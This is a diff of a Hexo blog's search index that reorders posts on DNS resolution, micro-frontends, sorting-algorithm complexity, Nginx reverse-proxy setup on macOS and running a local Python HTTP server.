@@ -1,18 +1,96 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Frontend Frontier</title>
-    <url>/en/2021/09/21/FrontendTech/</url>
-    <content><![CDATA[<h2 id="前端趋势"><a href="#前端趋势" class="headerlink" title="前端趋势"></a>前端趋势</h2><p>目前有走向微前端的趋势，所谓微前端的提出，可以说是在MPA（多页）和SPA（单页）之间的折中，现今大多数网站都采用SPA，然而随着时间的推移，SPA内的东西越来越多，并且由于各部分之间的耦合性，使得维护成本越来越高。</p>
+    <title>Basic Principle of DNS</title>
+    <url>/en/2021/11/25/BasicPrincipleofDNS/</url>
+    <content><![CDATA[<p><strong>DNS, also known as the Domain Names System, is an Internet service used to translate domain names and their corresponding IP addresses into servers.</strong></p>
 <a id="more"></a>
 
-<p>因此微前端的概念被提出，即降低内部的耦合性，实现类似高内聚低耦合的效果。目前流行的有Web-Component，将网页各部分模块化，各模块之间互不干扰，独立工作（例如各模块甚至可以使用不同的编程语言来编写）。（PS: 这一概念可以与后端的微服务对比参考）</p>
+<h1 id="Domain-Names-System"><a href="#Domain-Names-System" class="headerlink" title="Domain Names System"></a>Domain Names System</h1><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>DNS is used to translate domain names into IP addresses. Where.</p>
+<ol>
+<li>IP address: a dot-separated set of numbers that uniquely identifies a computer on the Internet</li>
+<li>domain name: a dot-separated string of names used to represent the name of a computer</li>
+</ol>
+<h2 id="Domain-Name-Composition"><a href="#Domain-Name-Composition" class="headerlink" title="Domain Name Composition"></a>Domain Name Composition</h2><p>** Domain names are hierarchical, from top to bottom (right to left in writing), divided into root, top level, second level, third level, etc. ** 1.</p>
+<blockquote>
+<ol>
+<li><p>root domain name: root</p>
+</li>
+<li><blockquote>
+<p>Top level domains: net, com, edu, org…</p>
+<ol start="3">
+<li><blockquote>
+<p>2nd level domains: ibm, baidu, alibaba, ….</p>
+<ol start="4">
+<li><blockquote>
+<p>Third level domains: www, mail, …</p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<p>Note: At each level of the domain name there is a name server, if in the top level domain, there is edu name server, com name server.</p>
+<h2 id="Query-method"><a href="#Query-method" class="headerlink" title="Query method"></a>Query method</h2><ul>
+<li>Recursive query: A only requests B until B returns the result A wants.</li>
+<li>Iterative query: A requests B, B returns the result informing A of the other servers it needs to request, then A requests C, D, E etc and gets the return result of the response.</li>
+</ul>
+<h2 id="Domain-Caching"><a href="#Domain-Caching" class="headerlink" title="Domain Caching"></a>Domain Caching</h2><ul>
+<li><p>For domain name servers.</p>
+<blockquote>
+<p>When resolving a domain name for the first time, a cache is used to hold the mapping of the domain name to the corresponding IP address.</p>
+</blockquote>
+</li>
+<li><p>For local computers.</p>
+<ul>
+<li><p>For browsers.</p>
+<blockquote>
+<p>The browser will use cache to save the actual IP address of the website domain name after it has been obtained to reduce the number of network requests</p>
+</blockquote>
+</li>
+<li><p>For operating systems.</p>
+<blockquote>
+<p>The operating system cache is the user’s own configured hosts file</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Query-process"><a href="#Query-process" class="headerlink" title="Query process"></a>Query process</h2><p>There are roughly seven steps</p>
+<ol>
+<li><p>first search the browser’s DNS cache, which maintains a table of domain names corresponding to IP addresses, return if available, and end the operation</p>
+</li>
+<li><p>if not found, continue to search the operating system’s DNS cache, return if available, and end the operation</p>
+</li>
+<li><p>if not found, the operating system sends the domain name to the local DNS server, which searches its own DNS cache recursively, returns if there is one, and ends the operation</p>
+</li>
+<li><p>if not found, the local server iterates to the parent DNS server</p>
+<blockquote>
+<ol>
+<li>the local DNS server sends a request to the root DNS server, which returns the top-level DNS address</li>
+<li>the local DNS server then sends a request to the top level DNS server, which returns the address of the second level DNS server</li>
+<li>the local DNS server then sends a request to the second level DNS server, which eventually returns the IP address corresponding to the domain name</li>
+</ol>
+</blockquote>
+</li>
+</ol>
+<hr>
+<p>At this point, the request phase is complete and the result is returned to the browser and cached in three steps. 5.</p>
+<ol start="5">
+<li>the local DNS server returns the IP address to the operating system and caches the mapping of the domain name to the IP</li>
+<li>the operating system returns the IP address to the browser and caches the mapping of the domain name to the IP</li>
+<li>The browser gets the IP address of the domain name and caches the mapping of the domain name to the IP</li>
+</ol>
 ]]></content>
       <categories>
         <category>FrontEnd/前端</category>
       </categories>
       <tags>
-        <tag>CONCEPT</tag>
+        <tag>Network</tag>
       </tags>
   </entry>
   <entry>
@@ -113,110 +191,19 @@
       </tags>
   </entry>
   <entry>
-    <title>Basic Principle of DNS</title>
-    <url>/en/2021/11/25/BasicPrincipleofDNS/</url>
-    <content><![CDATA[<p><strong>DNS, also known as the Domain Names System, is an Internet service used to translate domain names and their corresponding IP addresses into servers.</strong></p>
+    <title>Frontend Frontier</title>
+    <url>/en/2021/09/21/FrontendTech/</url>
+    <content><![CDATA[<h2 id="前端趋势"><a href="#前端趋势" class="headerlink" title="前端趋势"></a>前端趋势</h2><p>目前有走向微前端的趋势，所谓微前端的提出，可以说是在MPA（多页）和SPA（单页）之间的折中，现今大多数网站都采用SPA，然而随着时间的推移，SPA内的东西越来越多，并且由于各部分之间的耦合性，使得维护成本越来越高。</p>
 <a id="more"></a>
 
-<h1 id="Domain-Names-System"><a href="#Domain-Names-System" class="headerlink" title="Domain Names System"></a>Domain Names System</h1><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>DNS is used to translate domain names into IP addresses. Where.</p>
-<ol>
-<li>IP address: a dot-separated set of numbers that uniquely identifies a computer on the Internet</li>
-<li>domain name: a dot-separated string of names used to represent the name of a computer</li>
-</ol>
-<h2 id="Domain-Name-Composition"><a href="#Domain-Name-Composition" class="headerlink" title="Domain Name Composition"></a>Domain Name Composition</h2><p>** Domain names are hierarchical, from top to bottom (right to left in writing), divided into root, top level, second level, third level, etc. ** 1.</p>
-<blockquote>
-<ol>
-<li><p>root domain name: root</p>
-</li>
-<li><blockquote>
-<p>Top level domains: net, com, edu, org…</p>
-<ol start="3">
-<li><blockquote>
-<p>2nd level domains: ibm, baidu, alibaba, ….</p>
-<ol start="4">
-<li><blockquote>
-<p>Third level domains: www, mail, …</p>
-</blockquote>
-</li>
-</ol>
-</blockquote>
-</li>
-</ol>
-</blockquote>
-</li>
-</ol>
-</blockquote>
-<p>Note: At each level of the domain name there is a name server, if in the top level domain, there is edu name server, com name server.</p>
-<h2 id="Query-method"><a href="#Query-method" class="headerlink" title="Query method"></a>Query method</h2><ul>
-<li>Recursive query: A only requests B until B returns the result A wants.</li>
-<li>Iterative query: A requests B, B returns the result informing A of the other servers it needs to request, then A requests C, D, E etc and gets the return result of the response.</li>
-</ul>
-<h2 id="Domain-Caching"><a href="#Domain-Caching" class="headerlink" title="Domain Caching"></a>Domain Caching</h2><ul>
-<li><p>For domain name servers.</p>
-<blockquote>
-<p>When resolving a domain name for the first time, a cache is used to hold the mapping of the domain name to the corresponding IP address.</p>
-</blockquote>
-</li>
-<li><p>For local computers.</p>
-<ul>
-<li><p>For browsers.</p>
-<blockquote>
-<p>The browser will use cache to save the actual IP address of the website domain name after it has been obtained to reduce the number of network requests</p>
-</blockquote>
-</li>
-<li><p>For operating systems.</p>
-<blockquote>
-<p>The operating system cache is the user’s own configured hosts file</p>
-</blockquote>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="Query-process"><a href="#Query-process" class="headerlink" title="Query process"></a>Query process</h2><p>There are roughly seven steps</p>
-<ol>
-<li><p>first search the browser’s DNS cache, which maintains a table of domain names corresponding to IP addresses, return if available, and end the operation</p>
-</li>
-<li><p>if not found, continue to search the operating system’s DNS cache, return if available, and end the operation</p>
-</li>
-<li><p>if not found, the operating system sends the domain name to the local DNS server, which searches its own DNS cache recursively, returns if there is one, and ends the operation</p>
-</li>
-<li><p>if not found, the local server iterates to the parent DNS server</p>
-<blockquote>
-<ol>
-<li>the local DNS server sends a request to the root DNS server, which returns the top-level DNS address</li>
-<li>the local DNS server then sends a request to the top level DNS server, which returns the address of the second level DNS server</li>
-<li>the local DNS server then sends a request to the second level DNS server, which eventually returns the IP address corresponding to the domain name</li>
-</ol>
-</blockquote>
-</li>
-</ol>
-<hr>
-<p>At this point, the request phase is complete and the result is returned to the browser and cached in three steps. 5.</p>
-<ol start="5">
-<li>the local DNS server returns the IP address to the operating system and caches the mapping of the domain name to the IP</li>
-<li>the operating system returns the IP address to the browser and caches the mapping of the domain name to the IP</li>
-<li>The browser gets the IP address of the domain name and caches the mapping of the domain name to the IP</li>
-</ol>
+<p>因此微前端的概念被提出，即降低内部的耦合性，实现类似高内聚低耦合的效果。目前流行的有Web-Component，将网页各部分模块化，各模块之间互不干扰，独立工作（例如各模块甚至可以使用不同的编程语言来编写）。（PS: 这一概念可以与后端的微服务对比参考）</p>
 ]]></content>
       <categories>
         <category>FrontEnd/前端</category>
       </categories>
       <tags>
-        <tag>Network</tag>
+        <tag>CONCEPT</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>My first blog</title>
-    <url>/en/2021/02/14/My-first-blog/</url>
-    <content><![CDATA[<p>##Fist Charpter</p>
-<p>content</p>
-<hr>
-<p>##Second Charpter</p>
-<p>content</p>
-<hr>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>content</p>
-<p>:wq</p>
-]]></content>
   </entry>
   <entry>
     <title>HTML Basics Notes</title>
@@ -258,6 +245,152 @@
       </categories>
       <tags>
         <tag>HTML</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Handy CheatSheet</title>
+    <url>/en/2021/10/27/Handy-CheatSheet/</url>
+    <content><![CDATA[<h1 id="Algorithm-Time-Complexity"><a href="#Algorithm-Time-Complexity" class="headerlink" title="Algorithm Time Complexity"></a>Algorithm Time Complexity</h1><table>
+<thead>
+<tr>
+<th align="center">Algorithm</th>
+<th align="center">Best Time Complexity</th>
+<th align="center">Ave TC</th>
+<th align="center">Worst TC</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Selection Sort</td>
+<td align="center">Ω($n^2$)</td>
+<td align="center">Θ($n^2$)</td>
+<td align="center"><strong>O($n^2$)</strong></td>
+</tr>
+<tr>
+<td align="center">Bubble Sort</td>
+<td align="center">Ω($n$)</td>
+<td align="center">Θ($n^2$)</td>
+<td align="center"><strong>O($n^2$)</strong></td>
+</tr>
+<tr>
+<td align="center">Insertion Sort</td>
+<td align="center">Ω($n$)</td>
+<td align="center">Θ($n^2$)</td>
+<td align="center"><strong>O($n^2$)</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>Heap Sort</strong></td>
+<td align="center">Ω($nlogn$)</td>
+<td align="center">Θ($nlogn$)</td>
+<td align="center"><strong>O($nlogn$)</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>Quick Sort</strong></td>
+<td align="center">Ω($nlogn$)</td>
+<td align="center">Θ($nlogn$)</td>
+<td align="center"><strong>O($n^2$)</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>Merge Sort</strong></td>
+<td align="center">Ω($nlogn$)</td>
+<td align="center">Θ($nlogn$)</td>
+<td align="center"><strong>O($nlogn$)</strong></td>
+</tr>
+<tr>
+<td align="center">Bucket Sort</td>
+<td align="center">Ω($n+k$)</td>
+<td align="center">Θ($n+k$)</td>
+<td align="center">O($n^2$)</td>
+</tr>
+<tr>
+<td align="center">Radix Sort</td>
+<td align="center">Ω($nk$)</td>
+<td align="center">Θ($nk$)</td>
+<td align="center">O($nk$)</td>
+</tr>
+</tbody></table>
+<a id="more"></a>
+
+<h1 id="Time-Complexity-Rank"><a href="#Time-Complexity-Rank" class="headerlink" title="Time Complexity Rank"></a>Time Complexity Rank</h1><ol>
+<li>O($logn$)    ——————–    e.g. Binary Tree</li>
+<li>O($n$)          ——————–    e.g. Simple Search</li>
+<li>O($nlogn$)  ——————–    e.g. Quick Sort</li>
+</ol>
+<hr>
+<ol start="4">
+<li>O($n^2$)        ——————–     e.g. Selection Sort (Not Recommended Time Complexity)</li>
+</ol>
+<h1 id="Java-IDEA-IDE-ShortCut"><a href="#Java-IDEA-IDE-ShortCut" class="headerlink" title="Java IDEA IDE ShortCut"></a>Java IDEA IDE ShortCut</h1><ol>
+<li>sout + enter</li>
+<li>psvm + enter</li>
+<li>fori + enter</li>
+<li>iter + enter</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Algorithm/算法</category>
+      </categories>
+      <tags>
+        <tag>Algorithm</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>My first blog</title>
+    <url>/en/2021/02/14/My-first-blog/</url>
+    <content><![CDATA[<p>##Fist Charpter</p>
+<p>content</p>
+<hr>
+<p>##Second Charpter</p>
+<p>content</p>
+<hr>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>content</p>
+<p>:wq</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>NGINX Configure --- Reverse Proxy to resolve cross-domain based on MAC</title>
+    <url>/en/2021/10/19/NignxConfig/</url>
+    <content><![CDATA[<p><strong>关于Engine X（即Nignx）代理服务器配置说明</strong></p>
+<a id="more"></a>
+
+<h1 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h1><ol>
+<li><p>Terminal执行以下代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew search nginx</span><br><span class="line">brew install nginx</span><br></pre></td></tr></table></figure></li>
+<li><p>安装完成后，Terminal输出信息如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docroot is: &#x2F;usr&#x2F;local&#x2F;var&#x2F;www</span><br><span class="line"></span><br><span class="line">The default port has been set in &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;nginx.conf to 8080 so that</span><br><span class="line">nginx can run without sudo.</span><br><span class="line"></span><br><span class="line">nginx will load all files in &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;servers&#x2F;.</span><br><span class="line"></span><br><span class="line">To start nginx:</span><br><span class="line">  brew services start nginx</span><br><span class="line">Or, if you don&#39;t want&#x2F;need a background service you can just run:</span><br><span class="line">  &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g &#39;daemon off;&#39;</span><br></pre></td></tr></table></figure>
+<h1 id="启动Nginx"><a href="#启动Nginx" class="headerlink" title="启动Nginx"></a>启动Nginx</h1></li>
+<li><p>第一次安装后启动nginx，Terminal执行以下代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew services start nginx</span><br></pre></td></tr></table></figure>
+<p>以后再次启动nginx只需执行以下代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nginx</span><br></pre></td></tr></table></figure>
+<p><strong>注：</strong>如果出现不成功的情况，可采取以下方法：先结束主进程再重启</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -ax | grep nginx # 查看进程号</span><br><span class="line">sudo kill -s QUIT 主进程ID号</span><br><span class="line">sudo nginx</span><br></pre></td></tr></table></figure></li>
+<li><p>访问Nginx默认端口8080</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">localhost:8080</span><br></pre></td></tr></table></figure></li>
+<li><p>其他常用命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx -s stop # 停止nginx</span><br><span class="line">nginx -s reload # 重启nginx</span><br><span class="line">nginx # 启动nginx</span><br></pre></td></tr></table></figure></li>
+<li><p>配置<code>nginx.conf</code>文件</p>
+<ul>
+<li><p>进入Finder，按住<code>shift</code>+<code>command</code>+G，然后搜索<code>local/etc</code>，找到nginx文件夹</p>
+</li>
+<li><p>找到nginx.conf文件，进入修改</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">	listen: 80; &#x2F;&#x2F; 默认80端口，选择一个未被使用的接口即可</span><br><span class="line">	server_name: localhost;</span><br><span class="line">	</span><br><span class="line">	location &#x2F;&#123;</span><br><span class="line">		proxy_pass http:&#x2F;&#x2F;yourfronend.com; &#x2F;&#x2F; 此处为你浏览器所在的地址</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	location &#x2F;api&#123;</span><br><span class="line">		proxy_pass http:&#x2F;&#x2F;yourbackend.com; &#x2F;&#x2F; 此处为你浏览器所请求的地址</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>保存文件，重启Nginx</p>
+</li>
+<li><p>访问Nignx的监听端口，本例为<code>http://localhost:80</code></p>
+</li>
+<li><p>你会看到前端地址所在的内容</p>
+</li>
+<li><p>进行跨域测试</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Frontend/前端</category>
+      </categories>
+      <tags>
+        <tag>ClientServer</tag>
       </tags>
   </entry>
   <entry>
@@ -382,6 +515,39 @@
       </tags>
   </entry>
   <entry>
+    <title>Set up local testing server using Python</title>
+    <url>/en/2021/09/16/Python-localServer/</url>
+    <content><![CDATA[<p><strong>关于使用Python搭建简易本地服务器指南，可用于异步测试等。</strong></p>
+<a id="more"></a>
+
+<h2 id="测试本地文件的问题"><a href="#测试本地文件的问题" class="headerlink" title="测试本地文件的问题"></a>测试本地文件的问题</h2><ul>
+<li><strong>它们具有异步请求功能</strong>。如果您只是从本地文件运行示例，某些浏览器（包括 Chrome）将不会运行异步请求。这是因为安全限制。</li>
+<li><strong>它们具有服务器端语言</strong>。服务器端语言（例如 PHP 或 Python）需要一个特殊的服务器来解释代码并交付结果。</li>
+</ul>
+<h2 id="利用Python建立简单本地HTTP服务器"><a href="#利用Python建立简单本地HTTP服务器" class="headerlink" title="利用Python建立简单本地HTTP服务器"></a>利用Python建立简单本地HTTP服务器</h2><ul>
+<li><p>安装Python</p>
+</li>
+<li><p>运行命令行（我是mac），输入以下命令检查是否安装：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python --version</span><br></pre></td></tr></table></figure></li>
+<li><p>cd到目标文件目录</p>
+</li>
+<li><p>启动服务器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure></li>
+<li><p>默认端口号是8000，通过localhost:8000来访问此服务器</p>
+</li>
+<li><p><strong>PS:</strong> 切换端口号使用如下命令（以7800端口号为例）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7800</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><em><strong>最后， Python的http.server只是静态文件服务器，他无法运行python、php、javascript等语言的代码，所以要在本地运行服务器端语言代码，可以使用Python Web框架，比如Django等</strong></em></p>
+]]></content>
+      <categories>
+        <category>Frontend/前端</category>
+      </categories>
+      <tags>
+        <tag>Server</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Redux Introduction --- Operation Intro</title>
     <url>/en/2021/11/28/ReduxIntroduction/</url>
     <content><![CDATA[<p><strong>Redux 是 JavaScript 状态容器，提供可预测化的状态管理。</strong>随着 JavaScript 单页应用开发日趋复杂，<strong>JavaScript 需要管理比任何时候都要多的 state （状态）</strong>。 这些 state 可能包括<strong>服务器响应、缓存数据、本地生成尚未持久化到服务器的数据</strong>，也包括<strong>UI 状态，如激活的路由，被选中的标签，是否显示加载动效或者分页器</strong>等等。<strong>本次主要讲解当前针对react框架的redux，即REACT-REDUX。</strong></p>
@@ -451,67 +617,6 @@
       <tags>
         <tag>React</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>NGINX Configure --- Reverse Proxy to resolve cross-domain based on MAC</title>
-    <url>/en/2021/10/19/NignxConfig/</url>
-    <content><![CDATA[<p><strong>关于Engine X（即Nignx）代理服务器配置说明</strong></p>
-<a id="more"></a>
-
-<h1 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h1><ol>
-<li><p>Terminal执行以下代码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew search nginx</span><br><span class="line">brew install nginx</span><br></pre></td></tr></table></figure></li>
-<li><p>安装完成后，Terminal输出信息如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docroot is: &#x2F;usr&#x2F;local&#x2F;var&#x2F;www</span><br><span class="line"></span><br><span class="line">The default port has been set in &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;nginx.conf to 8080 so that</span><br><span class="line">nginx can run without sudo.</span><br><span class="line"></span><br><span class="line">nginx will load all files in &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;servers&#x2F;.</span><br><span class="line"></span><br><span class="line">To start nginx:</span><br><span class="line">  brew services start nginx</span><br><span class="line">Or, if you don&#39;t want&#x2F;need a background service you can just run:</span><br><span class="line">  &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g &#39;daemon off;&#39;</span><br></pre></td></tr></table></figure>
-<h1 id="启动Nginx"><a href="#启动Nginx" class="headerlink" title="启动Nginx"></a>启动Nginx</h1></li>
-<li><p>第一次安装后启动nginx，Terminal执行以下代码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew services start nginx</span><br></pre></td></tr></table></figure>
-<p>以后再次启动nginx只需执行以下代码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nginx</span><br></pre></td></tr></table></figure>
-<p><strong>注：</strong>如果出现不成功的情况，可采取以下方法：先结束主进程再重启</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -ax | grep nginx # 查看进程号</span><br><span class="line">sudo kill -s QUIT 主进程ID号</span><br><span class="line">sudo nginx</span><br></pre></td></tr></table></figure></li>
-<li><p>访问Nginx默认端口8080</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">localhost:8080</span><br></pre></td></tr></table></figure></li>
-<li><p>其他常用命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx -s stop # 停止nginx</span><br><span class="line">nginx -s reload # 重启nginx</span><br><span class="line">nginx # 启动nginx</span><br></pre></td></tr></table></figure></li>
-<li><p>配置<code>nginx.conf</code>文件</p>
-<ul>
-<li><p>进入Finder，按住<code>shift</code>+<code>command</code>+G，然后搜索<code>local/etc</code>，找到nginx文件夹</p>
-</li>
-<li><p>找到nginx.conf文件，进入修改</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">	listen: 80; &#x2F;&#x2F; 默认80端口，选择一个未被使用的接口即可</span><br><span class="line">	server_name: localhost;</span><br><span class="line">	</span><br><span class="line">	location &#x2F;&#123;</span><br><span class="line">		proxy_pass http:&#x2F;&#x2F;yourfronend.com; &#x2F;&#x2F; 此处为你浏览器所在的地址</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	location &#x2F;api&#123;</span><br><span class="line">		proxy_pass http:&#x2F;&#x2F;yourbackend.com; &#x2F;&#x2F; 此处为你浏览器所请求的地址</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>保存文件，重启Nginx</p>
-</li>
-<li><p>访问Nignx的监听端口，本例为<code>http://localhost:80</code></p>
-</li>
-<li><p>你会看到前端地址所在的内容</p>
-</li>
-<li><p>进行跨域测试</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Frontend/前端</category>
-      </categories>
-      <tags>
-        <tag>ClientServer</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/en/2021/02/14/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>R-NoteBook</title>
@@ -699,122 +804,202 @@
       </tags>
   </entry>
   <entry>
-    <title>Handy CheatSheet</title>
-    <url>/en/2021/10/27/Handy-CheatSheet/</url>
-    <content><![CDATA[<h1 id="Algorithm-Time-Complexity"><a href="#Algorithm-Time-Complexity" class="headerlink" title="Algorithm Time Complexity"></a>Algorithm Time Complexity</h1><table>
-<thead>
-<tr>
-<th align="center">Algorithm</th>
-<th align="center">Best Time Complexity</th>
-<th align="center">Ave TC</th>
-<th align="center">Worst TC</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">Selection Sort</td>
-<td align="center">Ω($n^2$)</td>
-<td align="center">Θ($n^2$)</td>
-<td align="center"><strong>O($n^2$)</strong></td>
-</tr>
-<tr>
-<td align="center">Bubble Sort</td>
-<td align="center">Ω($n$)</td>
-<td align="center">Θ($n^2$)</td>
-<td align="center"><strong>O($n^2$)</strong></td>
-</tr>
-<tr>
-<td align="center">Insertion Sort</td>
-<td align="center">Ω($n$)</td>
-<td align="center">Θ($n^2$)</td>
-<td align="center"><strong>O($n^2$)</strong></td>
-</tr>
-<tr>
-<td align="center"><strong>Heap Sort</strong></td>
-<td align="center">Ω($nlogn$)</td>
-<td align="center">Θ($nlogn$)</td>
-<td align="center"><strong>O($nlogn$)</strong></td>
-</tr>
-<tr>
-<td align="center"><strong>Quick Sort</strong></td>
-<td align="center">Ω($nlogn$)</td>
-<td align="center">Θ($nlogn$)</td>
-<td align="center"><strong>O($n^2$)</strong></td>
-</tr>
-<tr>
-<td align="center"><strong>Merge Sort</strong></td>
-<td align="center">Ω($nlogn$)</td>
-<td align="center">Θ($nlogn$)</td>
-<td align="center"><strong>O($nlogn$)</strong></td>
-</tr>
-<tr>
-<td align="center">Bucket Sort</td>
-<td align="center">Ω($n+k$)</td>
-<td align="center">Θ($n+k$)</td>
-<td align="center">O($n^2$)</td>
-</tr>
-<tr>
-<td align="center">Radix Sort</td>
-<td align="center">Ω($nk$)</td>
-<td align="center">Θ($nk$)</td>
-<td align="center">O($nk$)</td>
-</tr>
-</tbody></table>
-<a id="more"></a>
-
-<h1 id="Time-Complexity-Rank"><a href="#Time-Complexity-Rank" class="headerlink" title="Time Complexity Rank"></a>Time Complexity Rank</h1><ol>
-<li>O($logn$)    ——————–    e.g. Binary Tree</li>
-<li>O($n$)          ——————–    e.g. Simple Search</li>
-<li>O($nlogn$)  ——————–    e.g. Quick Sort</li>
-</ol>
-<hr>
-<ol start="4">
-<li>O($n^2$)        ——————–     e.g. Selection Sort (Not Recommended Time Complexity)</li>
-</ol>
-<h1 id="Java-IDEA-IDE-ShortCut"><a href="#Java-IDEA-IDE-ShortCut" class="headerlink" title="Java IDEA IDE ShortCut"></a>Java IDEA IDE ShortCut</h1><ol>
-<li>sout + enter</li>
-<li>psvm + enter</li>
-<li>fori + enter</li>
-<li>iter + enter</li>
-</ol>
+    <title>Hello World</title>
+    <url>/en/2021/02/14/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
